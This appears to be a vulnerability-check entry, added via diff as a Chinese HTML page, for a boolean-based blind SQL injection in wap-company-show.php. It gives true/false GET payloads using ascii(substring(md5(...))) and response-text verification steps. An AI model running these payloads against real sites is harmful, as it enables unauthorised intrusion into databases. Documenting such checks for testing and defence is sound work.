@@ -1,0 +1,17 @@
+<meta charset="UTF-8">
+<div>
+    <h3>SQL注入 URL: </h3>
+    <ul>
+        <p>/wap/wap-company-show.php</p>
+    </ul>
+    <h3>GET-payload: </h3>
+        <p>true</p>
+        <code>?id=1%20and%20ascii(substring((md5(0x11)),1,1))=52</code>
+        <p>false</p>
+        <code>?id=1%20and%20ascii(substring((md5(0x11)),1,1))=53</code>
+    <h3>验证过程</h3>
+    <p>访问 http://example.com/wap/wap-company-show.php?id=1%20and%20ascii(substring((md5(0x11)),1,1))=52</p>
+    <p>查看response text中是否有 url="wap-jobs-show.php?id=1" </p>
+    <p>访问 http://example.com/wap/wap-company-show.php?id=1%20and%20ascii(substring((md5(0x11)),1,1))=53</p>
+    <p>查找response text中是否没有 url="wap-jobs-show.php?id=1"</p>
+</div>
